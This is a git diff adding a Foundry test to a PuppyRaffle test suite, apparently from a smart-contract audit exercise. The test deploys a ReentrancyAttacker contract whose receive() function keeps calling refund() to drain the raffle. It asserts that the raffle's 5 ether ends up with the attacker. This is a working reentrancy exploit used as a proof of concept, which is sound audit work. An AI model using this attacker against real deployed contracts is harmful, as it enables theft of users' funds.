@@ -271,4 +271,66 @@ contract PuppyRaffleTest is Test {
         assertLt(gasLeftAlice, gasLeftCris);
         assertLt(gasLeftCris, gasLeftDock);
     }
+
+    function testReentrancyInRefundFunction() public playersEntered {
+        address alice = makeAddr("alice");
+        deal(alice, 1 ether);
+        vm.prank(alice);
+        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));
+
+        address[] memory arr = new address[](1);
+        arr[0] = address(attacker);
+        
+        vm.prank(address(attacker));
+        puppyRaffle.enterRaffle{value:entranceFee}(arr);
+
+        console.log("puppyRaffle balance before attack: %s", address(puppyRaffle).balance);
+        console.log("attackContract balance before attack: %s", address(attacker).balance);
+
+        assertEq(address(puppyRaffle).balance, 5 ether);
+        assertEq(address(attacker).balance, 0);
+
+        vm.prank(alice);
+        attacker.setIdx();
+
+        vm.startPrank(address(attacker));
+        uint256 idx = puppyRaffle.getActivePlayerIndex(address(attacker));
+        puppyRaffle.refund(idx);
+        vm.stopPrank();
+
+        console.log("puppyRaffle balance after attack: %s", address(puppyRaffle).balance);
+        console.log("attackContract balance after attack: %s", address(attacker).balance);
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(attacker).balance, 5 ether);
+
+    }
+
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle public raffle;
+    uint256 constant entranceFee = 1e18;
+    uint256 public idx;
+
+    address private owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "You are not the owner");
+        _;
+    }
+
+    constructor(address _raffle) payable {
+        raffle = PuppyRaffle(_raffle);
+        owner = msg.sender;
+    }
+
+    function setIdx() external onlyOwner {
+        idx = raffle.getActivePlayerIndex(address(this));
+    }
+
+    receive() external payable {
+        if (address(raffle).balance > 0) {
+            raffle.refund(idx);
+        }
+    }
 }
